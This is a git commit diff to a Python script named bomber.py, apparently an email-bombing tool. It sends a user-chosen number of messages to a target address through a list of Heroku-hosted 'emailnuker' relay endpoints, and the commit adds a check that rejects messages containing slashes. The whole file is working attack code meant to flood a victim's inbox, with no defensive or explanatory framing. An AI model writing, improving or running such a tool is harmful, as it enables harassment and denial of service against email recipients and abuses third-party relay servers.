622ff9ed2073eda92aef05032cff848981d4c8a4
bagarrattaa <apple.macos.ios.6@gmail.com>
2022-05-17 16:13:36 +0530

    gortho

--- bomber.py
+++ bomber.py
@@ -16,14 +16,17 @@ msg=msg.replace(" ","%20")
 sub=sub.replace(" ","%20")
 srvrlist={1:"https://nnewemailnuker.herokuapp.com/1",2:"https://nnewemailnuker.herokuapp.com/2",3:"https://nnewemailnuker.herokuapp.com/18",4:"https://nnewemailnuker.herokuapp.com/4",5:"https://nnewemailnuker.herokuapp.com/5",6:"https://nnewemailnuker.herokuapp.com/6",7:"https://nnewemailnuker.herokuapp.com/7",8:"https://nnewemailnuker.herokuapp.com/8",9:"https://nnewemailnuker.herokuapp.com/9",10:"https://nnewemailnuker.herokuapp.com/10",11:"https://nnewemailnuker.herokuapp.com/11",12:"https://nnewemailnuker.herokuapp.com/1",13:"https://nnewemailnuker.herokuapp.com/13",14:"https://nnewemailnuker.herokuapp.com/14",15:"https://nnewemailnuker.herokuapp.com/15",16:"https://nnewemailnuker.herokuapp.com/16",17:"https://nnewemailnuker.herokuapp.com/17",18:"https://nnewemailnuker.herokuapp.com/18",19:"https://nnewemailnuker.herokuapp.com/1",20:"https://nnewemailnuker.herokuapp.com/2",21:"https://nnewemailnuker.herokuapp.com/2"}
 am=int(input("enter amount of msgs to send "))
-for i in range(0,am): 
-    srvr=random.randint(1,21)
-    req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
-    if req.text=="Sent": 
-        print("           ")
-        print (str(i+1)+" msgs sent")
-    else: 
-        print ("failed to send msg ")
-        print("please report this error to developer ")
-        print("the responce reseaved from the server was: "+str(srvr)+req.text)
-        break
+if "/" in msg: 
+    print("Invalid charactors in message")
+else: 
+    for i in range(0,am): 
+        srvr=random.randint(1,21)
+        req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
+        if req.text=="Sent": 
+            print("           ")
+            print (str(i+1)+" msgs sent")
+        else: 
+            print ("failed to send msg ")
+            print("please report this error to developer ")
+            print("the responce reseaved from the server was: "+str(srvr)+req.text)
+            break
